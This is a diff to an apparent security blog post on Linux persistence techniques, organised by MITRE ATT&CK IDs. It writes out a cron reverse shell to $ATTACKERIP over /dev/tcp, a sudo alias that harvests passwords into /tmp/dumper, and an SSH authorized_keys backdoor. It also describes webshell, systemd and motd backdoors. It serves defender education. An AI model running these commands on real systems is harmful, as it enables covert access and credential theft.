@@ -15,8 +15,7 @@ tags: [linux, persistence]
 
 ---
 
-
-This post will cover a few common Linux persistence techniques used by an adversary to establish permanent access. This blog assumed that you have basic knowledge of Linux OS such as Linux service, user privilege, crontab, remote management etc. The adversaries are attempting to keep their foothold. Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access.
+This post will cover a few common Linux persistence techniques used by an adversary to establish permanent access. This blog assumed that you have basic knowledge of Linux OS such as Linux service, user privilege, crontab, remote management, reverse shell etc. It is also noted that root privilege is required to conduct mostly techniques used in this blog. The adversaries are attempting to keep their foothold. Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access.
 
 ---
 ## Creating privilege account
@@ -24,6 +23,8 @@ This post will cover a few common Linux persistence techniques used by an advers
 [MITRE ID: T1136.001](https://attack.mitre.org/techniques/T1136/001/)
 
 The adversary tends to create a high privilege account to maintain access to the compromised system. They usually create a user with a sudo privilege across the system.
+
+Required: root privilege
 
 	$ Command: 
 	
@@ -38,6 +39,8 @@ The adversary tends to create a high privilege account to maintain access to the
 [MITRE ID: T1548.001](https://attack.mitre.org/techniques/T1548/001/)
 
 A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that runs the binary will have access to the system with the root privilege. Below is an example of creating a SUID binary named suid00r.
+
+Required: root privilege
 
 	$ Command:
 	
@@ -55,17 +58,23 @@ A binary with its SUID bit set, implying that everything run by the programs wil
 
 The crontab file contains a list of tasks that you wish to execute on a regular basis, as well as the name of the command that manages them. Crontab stands for "cron table," as it executes tasks using the cron job scheduler. 
 
-The adversary can create a reverse shell that points to their C2 server using cron job upon reboot. Below is a simple example of bash reverse shell as for the PoC.
+The adversary can create a reverse shell that points to their C2 server using the cron job every 12th hour. Below is a simple example of bash reverse shell as for the PoC.
+
+Noted: `0 */12 * * *` means "At minute 0 past every 12th hour."
+
+Required: root or normal user privilege
 
 	$ Command:
 	
-	root@victim$ echo "@reboot sleep 120 && /bin/bash -l > /dev/tcp/$ATTACKERIP/4444 0<&1 2>&1"
+	root@victim$ (crontab -l > .tab ; echo "0 */12 * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERIP/4444 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
 
 ## Creating .bashrc backdoor
 
 [MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)
 
 A bashrc file is a shell script file that Linux uses when starting up to load items like modules and aliases into a user's profile. So, whenever an interactive session is launched, the .bashrc file will load the reverse shell pointing to the adversary C2 server.
+
+Required: root or normal user privilege
 
 	$ Command:
 	
@@ -80,6 +89,8 @@ Alias is a shortcut command that performs the same functions as if we typed the 
 
 As for the PoC, we use `sudo` alias. Whenever the user types sudo command for example "`sudo netstat -plnt`", the sudo alias will load then ask for the user's password and dump the plaintext password to the /tmp/dumper directory before the legitimate sudo binary from `/usr/bin/sudo` spawn.
 
+Required: root or normal user privilege
+
 	$ Command:
 	
 	victim@server$ echo "alias sudo='echo -n "[sudo] password for "\$USER": " && read -r password && echo ""\$password"" >/tmp/dumper && /usr/bin/sudo \$@'" >> ~/.bashrc
@@ -91,6 +102,8 @@ As for the PoC, we use `sudo` alias. Whenever the user types sudo command for ex
 FFor Linux operating systems, Systemd is a system and service manager. It includes capabilities such as the parallel launch of system services at boot time, on-demand activation of daemons, and dependency-based service control logic, and is meant to be backwards compatible with SysV init scripts.
 
 As for the PoC, we create `backdoorx` service in /etc/systemd/system/ directory. Whenever the system start and the network is ready, it will establish a reverse shell to adversary C2.
+
+Required: root privilege
 
 	$ Command:
 	
@@ -118,6 +131,8 @@ In SSH, the authorized keys file defines the SSH keys that can be used to login 
 
 As for the PoC, we simulate the adversary SSH Public Key that commonly known as id_rsa.pub that is placed on the server we intend to log in to.
 
+Required: root or normal user privilege
+
 	$ Command:
 	
 	victim@server$ echo 'ssh-rsa AAAAB3Nza7Y-SNIP-6v6tgj6V5Dt root@C2box' >> ~/.ssh/authorized_keys
@@ -128,6 +143,8 @@ As for the PoC, we simulate the adversary SSH Public Key that commonly known as 
 When you use SSH to log into a machine, a banner called Motd (Message of the Day) shows. Motd scripts for Ubuntu/Debian may be found in /etc/update-motd.d/. 
 
 As for the PoC, we created a MOTD banner named 20-motd-bas that will make a reverse shell to the adversary C2 server whenever any user login via SSH.
+
+Required: root privilege
 
 	$ Command:
 	
@@ -147,6 +164,8 @@ How does it work? At each login, pam motd(8) as the root user invokes executable
 
 Adversary commonly placed a webshell for later access. A simple PoC is shown below.
 
+Required: root or web server privilege
+
 	$ Command:
 	victim@server$ WEBSHELL='bdoor.php'
 	victim@server$ PATH2WEBSHELL=/var/www/html/secretfolder/$WEBSHELL
@@ -163,6 +182,8 @@ Adversary commonly placed a webshell for later access. A simple PoC is shown bel
 ## Creating Network startup as backdoor
 
 There are four directories in which scripts can be placed which will always be run for any interface during certain phases of ifup and ifdown commands. One of them is `/etc/network/if-up.d/`. Scripts in this directory are run after bringing the interface up [2].
+
+Required: root privilege
 
 	$ Command:
 	
@@ -182,6 +203,8 @@ There are four directories in which scripts can be placed which will always be r
 [MITRE ID: T1574.008](https://attack.mitre.org/techniques/T1574/008/)
 
 An adversary may create a wrapper from a legitimate binary as simple as shown below. Whenever any user types command `date`, a reverse shell is spawned to the C2.
+
+Required: root privilege
 
 	$ Command:
 	
@@ -205,6 +228,8 @@ TCP wrappers rely on two configuration files as the basis for access control:
 
 These files are used to determine whether or not a client may connect to a network service on a remote host. 
 As for PoC, if someone connects to any port on the target machine such as SSH, a reverse shell will be spawned to the adversary server.
+
+Required: root privilege
 
 	$ Command:
 
